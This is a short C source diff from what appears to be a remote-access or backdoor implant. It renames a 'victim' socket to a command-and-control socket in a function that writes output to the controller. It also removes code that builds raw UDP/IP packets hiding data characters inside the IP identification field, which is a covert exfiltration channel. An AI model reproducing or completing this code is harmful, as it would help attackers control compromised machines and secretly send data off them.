@@ -70,9 +70,7 @@ int write_all(int file_desc, const char *str, struct options_victim* ov) {
 
     do {
 //        bytesWritten = (int)write(file_desc, str, bytesToWrite);
-        // TODO: CREATE RAW PACKET
-        printf("%s", str);
-        bytesWritten = (int)write(ov->cvc_socket, str, size);
+        bytesWritten = (int)write(ov->cnc_socket, str, size);
         if(bytesWritten == -1) {
             return 0;
         }
@@ -155,32 +153,3 @@ static int is_char_device(const struct dirent *file) {
 
     return S_ISCHR(filestat.st_mode);
 }
-
-
-unsigned short create_cvc_udp_header(struct udphdr* uh) {
-    uh->source = htons(VICTIM_PORT);
-    uh->dest = htons(CVC_PORT);
-    uh->len = htons(sizeof(struct udphdr));
-    uh->check = calculate_checksum(&uh, sizeof(struct udphdr));
-
-    return sizeof(struct udphdr);
-}
-
-
-unsigned short create_cvc_ip_header(struct iphdr* ih, char c, struct options_victim* ov) {
-
-    ih->ihl = 5;
-    ih->version = 4;
-    ih->tos = 0;
-    ih->id = htons(hide_data((uint16_t)c));
-    ih->tot_len = htons(28);
-    ih->ttl = 64;
-    ih->frag_off = 0;
-    ih->protocol = IPPROTO_UDP;
-    ih->saddr = host_convert(ov->my_ip);
-    ih->daddr = host_convert(ov->cvc_ip);
-    ih->check = calculate_checksum(&ih, sizeof(struct iphdr));
-
-    return sizeof(struct iphdr);
-}
-
